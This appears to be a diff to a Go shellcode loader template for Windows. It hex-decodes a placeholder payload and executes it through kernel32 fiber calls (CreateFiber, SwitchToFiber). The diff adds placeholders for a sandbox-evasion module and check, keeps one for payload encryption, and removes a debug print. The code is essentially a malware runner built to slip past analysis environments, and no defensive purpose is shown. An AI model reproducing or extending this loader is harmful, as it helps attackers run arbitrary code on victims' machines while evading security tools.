@@ -2,10 +2,10 @@ package main
 
 import (
 	"encoding/hex"
-	"fmt"
 	"golang.org/x/sys/windows"
 	"unsafe"
 	//__ENCRYPTMODULE__
+	//__SANDBOXMODULE__
 )
 
 const (
@@ -16,6 +16,7 @@ const (
 )
 
 func main() {
+	//__SANDBOX__
 	shellcode, _ := hex.DecodeString("__SHELLCODE__")
 	//__ENCRYPTCODE__
 	kernel32 := windows.NewLazySystemDLL("kernel32.dll")
@@ -34,5 +35,4 @@ func main() {
 	fiber, _, _ := CreateFiber.Call(0, addr, 0)
 	_, _, _ = SwitchToFiber.Call(fiber)
 	_, _, _ = SwitchToFiber.Call(fiberAddr)
-	fmt.Println("ok")
 }
